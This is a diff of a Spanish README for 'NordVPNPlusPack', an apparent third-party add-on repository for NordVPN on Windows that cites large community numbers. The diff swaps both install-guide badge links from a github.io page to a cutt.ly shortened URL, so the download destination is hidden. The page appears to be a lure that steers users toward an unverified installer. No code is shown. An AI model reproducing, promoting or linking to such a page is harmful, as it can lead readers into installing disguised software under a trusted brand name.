@@ -6,7 +6,7 @@
 
 **Acerca de NordVPNPlusPack**: NordVPNPlusPack es un repositorio para usuarios de *NordVPN* en Windows, con herramientas y configuraciones personalizadas para optimizar conexiones. Mejora la velocidad y seguridad con soluciones creadas por la comunidad. Con 100K+ visitantes y 80K+ miembros, ¡eleva tu privacidad en línea hoy! (276 caracteres)
 
-<a href="https://nordvpn-comunidad.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/BrNrLeoU" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
 </a>
 
@@ -21,7 +21,7 @@ Potencia tu *NordVPN* con **NordVPNPlusPack** en Windows:
 2. **Soluciona Problemas de Acceso** 🌐  
    Desactiva filtros de red o prueba navegadores como Edge o Firefox si es necesario.
 
-<a href="https://nordvpn-comunidad.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/BrNrLeoU" target="_blank">
   <img src="https://img.shields.io/badge/Guía_de_instalación-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
 </a>
 
